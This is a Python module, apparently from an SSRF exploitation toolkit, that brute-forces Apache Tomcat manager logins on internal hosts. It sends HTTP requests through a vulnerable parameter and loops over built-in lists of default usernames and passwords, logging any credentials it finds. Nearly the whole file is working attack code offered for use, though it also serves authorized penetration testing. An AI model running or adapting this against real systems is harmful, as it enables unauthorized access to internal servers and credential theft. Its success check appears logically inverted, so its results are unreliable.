from core.utils import *
import logging

name          = "tomcat"
description   = "Tomcat - Bruteforce manager"
author        = "Swissky"
documentation = [
    "https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html", 
    "https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown"
    ]

class exploit():
    SERVER_HOST   = "127.0.0.1"
    SERVER_PORT   = "8888"
    SERVER_TOMCAT = "manager/html"
    tomcat_user = ["tomcat", "admin", "both", "manager", "role1", "role", "root"]
    tomcat_pass = ["password", "tomcat", "admin", "manager", "role1", "changethis", "changeme", "r00t", "root", "s3cret","Password1", "password1"]

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Using a generator to create the host list
        gen_host = gen_ip_list(self.SERVER_HOST, args.level)
        for ip in gen_host:
            for usr in self.tomcat_user:
                for pss in self.tomcat_pass:
                    payload = wrapper_http(self.SERVER_TOMCAT, ip, self.SERVER_PORT, usernm=usr, passwd=pss)
                    r = requester.do_request(args.param, payload)

                    if not "s3cret" in r.text:
                        logging.info("Found credential \033[32m{}\033[0m:\033[32m{}\033[0m".format(usr, pss))